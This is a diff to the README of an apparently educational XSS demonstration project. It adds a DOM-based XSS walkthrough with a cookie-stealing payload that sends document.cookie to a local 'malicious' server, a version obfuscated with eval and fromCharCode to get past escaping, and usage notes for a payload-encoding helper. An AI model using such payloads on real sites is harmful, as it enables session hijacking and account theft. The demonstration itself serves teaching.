@@ -24,7 +24,6 @@ the page. If you want to clear the database, just delete the `database.db` file 
 
 # Demostrations of XSS
 ## Things to note BEFORE trying the demostration
-* For Reflected XSS and DOM-Based XSS
 * Go to [127.0.0.1:5000/cookie](http://127.0.0.1:5000/cookie) to create set a cookie for the main website
 * Run `python app.py` in the malicious website folder to run the malicious server to collect the cookies
 
@@ -51,6 +50,23 @@ the page. If you want to clear the database, just delete the `database.db` file 
 ## Demostration for DOM-Based XSS
 * Key in `http://localhost:5000/?num=alert(123)` into the address bar
 * An alert for 123 will appear as an alert
+
+In order to do something similar to the above, we cannot directly, insert `window.location=document.location='http://127.0.0.1:1000/?c='+document.cookie;` into the address bar after the query as some characters might be escaped
+
+In this case the `toString().constructor.fromCharCode` will be our best friend
+* Make sure both servers are up
+* Key in `eval(toString().constructor.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,50,55,46,48,46,48,46,49,58,49,48,48,48,47,63,99,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,59))` after the `num?` query.
+
+What does it do?
+* `toString().constructor.fromCharCode(...)` converts the character code for the javascript into a javascript string
+* `eval` will evalucate the string. The string above corresponds to `document.location='http://127.0.0.1:1000/?c='+document.cookie;`
+* The evaluator inside the DOM will evaluate the code as `document.location='http://127.0.0.1:1000/?c='+document.cookie;` and execute the reflected attack
+
+You can make use of the XSSQueryFormer inside the folder to experiment around with the different javascript codes to be inserted as the payload
+
+Usage:
+* `python XSSQueryFormer.py "{Javascript Code here}"` to convert your code to javascript
+* `python XSSQueryFormer.py -h` to show help message
 
 # Protection mechanisms
 
